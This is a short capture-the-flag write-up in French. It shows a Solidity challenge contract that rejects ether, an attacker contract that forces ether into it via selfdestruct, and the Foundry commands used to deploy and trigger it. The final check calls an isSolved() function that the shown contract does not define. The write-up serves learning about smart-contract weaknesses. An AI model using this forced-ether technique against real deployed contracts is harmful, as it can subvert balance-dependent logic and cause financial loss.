# BomberMan - K.L.M

## Contrat

Un poil plus compliqué:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Challenge {

    bool public solved = false;

    function win() public {
        if (address(this).balance!=0){
            solved = true;
        }
    }

    function receive() public payable{
        revert();
    }
}
```

## Solve
Le but est de pouvoir envoyer des ether au contrat, problème, il n'en veut pas :D Alors on va le **forcer** !

Contrat d'attaque :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BOMB {

    function BOOM(address payable _a) public payable {
         selfdestruct(_a);
    }
    receive() external payable{
    }
}
```

Ensuite, on déploie, on call et BOOM !

```bash
mkdir atksrc
cd atksrc
forge init
rm src/* test/* script/*
mv atk.sol src/
forge build
forge create src/atk.sol:BOMB --rpc-url $RPC --private-key $PK

Ensuite, on utilisera $ATK comme variable contenant l'adresse de notre contrat d'attaque.
```

```bash
cast send $ATK "BOOM(address)" $TAR --value 1wei -r $RPC --private-key $PK
cast send $TAR "win()" -r $RPC --private-key $PK
cast call $TAR "isSolved()(bool)" -r $RPC
True
```

Win !